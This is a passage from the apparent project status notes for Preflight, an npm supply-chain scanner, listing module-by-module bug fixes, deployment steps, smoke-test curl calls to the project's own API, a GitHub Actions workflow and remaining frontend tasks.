| 4 | `tarfile.open()` in `_fetch_file_from_tarball` unguarded — malformed tarball raises `TarError` uncaught | Extracted to `_extract_js_from_tarball()` (sync) with try/except |
| 5 | `_fetch_file_from_tarball` re-downloaded the tarball already fetched by script_diff — double CDN fetch (~1–3s, 2–16MB) | `run()` accepts `tarball_bytes: bytes \| None`; passes to `_extract_js_from_tarball()` directly if present; only falls back to `_fetch_tarball_bytes()` if bytes not provided |
| 6 | Inline JS regex `^node\s+-e\s+["\'](.+)["\']$` too strict — fails on mixed quotes, unquoted args | More permissive: search for trailing arg, strip outer quotes only if matched pair |
| 7 | `FileNotFoundError` (node not installed) silently returned empty list — no diagnostic | Now logs `log.warning("acorn scan failed: %s", e)` |
| 8 | Unused `settings` import | Removed |

---

### maintainer.py — hardened (session 3, May 9 2026)

| # | Gap | Fix |
|---|---|---|
| 1 | `r.raise_for_status()` unguarded — registry 5xx raises `httpx.HTTPStatusError` uncaught | Wrapped in try/except → `RegistryTimeoutError` |
| 2 | `versions.get(new_version, {})` silently returned `{}` when version absent — all provenance checks returned False, masking the error | Now raises `PackageNotFoundError` if `new_version` not in `versions` |
| 3 | `weekly_downloads` read from full package endpoint — field does not exist there, always 0; downweight for large packages never triggers | Accepted as known limitation: missing data makes score slightly higher (safer direction — false positives not false negatives) |

---

### gemini.py — hardened (session 3, May 9 2026)

| # | Gap | Fix |
|---|---|---|
| 1 | `genai.configure(api_key=...)` called inside `_call_gemini` on every request — ~100ms overhead per call | Moved to module level (executed once at import time) |
| 2 | `asyncio.get_event_loop()` deprecated in Python 3.10+, removed in 3.12 async contexts | Changed to `asyncio.get_running_loop()` |
| 3 | `_parse_gemini_response` had no schema validation — Gemini could return `verdict: "MAYBE"` or `confidence: 42.0` | Added: verdict enum check (falls back to `"WARN"`), confidence clamped to `[0.0, 1.0]`, summary falls back to default string |
| 4 | Unused `GeminiError` import | Removed |

---

### analyze.py — fixed (session 3, May 9 2026)

| # | Gap | Fix |
|---|---|---|
| 1 | Demo condition `req.demo or (... and req.demo)` — second clause always subsumed by first | Simplified to `if req.demo:` |
| 2 | `ast_scanner.run()` called with `tarball_url` only — bytes not passed, causing re-download | Now passes `sd_result.tarball_bytes` as fifth argument |

---

## Remaining Tasks (everything before this is done)

### Immediate — deployment (can do now)
1. Add `GEMINI_API_KEY` and `MONGODB_URI` to Render dashboard → Deploy
2. Verify `GET https://preflight-api.onrender.com/health` returns all checks ok
3. Import repo to Vercel, set root dir = `preflight-web`, add `NEXT_PUBLIC_API_URL` → Deploy
4. Set up cron-job.org: ping `GET /health` every 14 minutes
5. `git tag v1.0.0 && git push origin v1.0.0`

### Deployment smoke tests (run in order after deploy)
```bash
# 1. All checks green
curl https://preflight-api.onrender.com/health

# 2. Demo scan seeded
curl https://preflight-api.onrender.com/scans/64a7f3e2b1c4d5e6f7a8b9c0

# 3. Demo analysis (should take ~2.7s, return BLOCK 94%)
curl -X POST https://preflight-api.onrender.com/analyze \
  -H "Content-Type: application/json" \
  -d '{"package_name":"axios","old_version":"1.7.9","new_version":"1.7.10","demo":true}'

# 4. Real analysis with Gemini (should take ~10s, return PASS)
curl -X POST https://preflight-api.onrender.com/analyze \
  -H "Content-Type: application/json" \
  -d '{"package_name":"lodash","old_version":"4.17.20","new_version":"4.17.21"}'
```

### GitHub Action e2e test
Create test repo `Mustaqeem-Rafi/preflight-test-target` with `package-lock.json` + this workflow:
```yaml
name: Preflight
on:
  pull_request:
    paths: ['package-lock.json']
permissions:
  pull-requests: write
  statuses: write
  contents: read
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: Javeria-taj/preflight-ai@v1.0.0
        with:
          fail_on_block: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```
Open a PR bumping a package version → expect PR comment + commit status.

### Frontend (teammate's work)
See `preflight-web/API_CONTRACT.md` for full integration guide. Key items:
- Create `preflight-web/lib/api.ts` (was deleted — full template in API_CONTRACT.md)
- Wire `/demo` page to `POST /analyze` with `demo: true`
- Wire `/scans/[id]` to `GET /scans/:id` using `useParams()`
- Fix demo scan link: `scn_a1f7e2` → `64a7f3e2b1c4d5e6f7a8b9c0`
- Fix `INSTALL_YAML` in `lib/data.ts`: `fail-on` → `fail_on_block`

### Pre-presentation checklist
- [ ] `/health` returns all three checks ok on Render
- [ ] `/demo` page animation completes cleanly 3/3 times
- [ ] Render not cold-starting (keep-alive cron active)
- [ ] `v1.0.0` tag exists on GitHub
- [ ] README complete (judges look at the repo)

---

## Design Philosophy

> "Existing tools scan for known bad packages. Preflight reasons about *unknown* bad packages — the ones that slipped through because nobody had seen them yet."

Every system design choice reinforces this: the 4-signal funnel exists because no single signal is sufficient. Behavioral analysis + identity signals + AI synthesis = confidence that individual heuristics can't achieve.
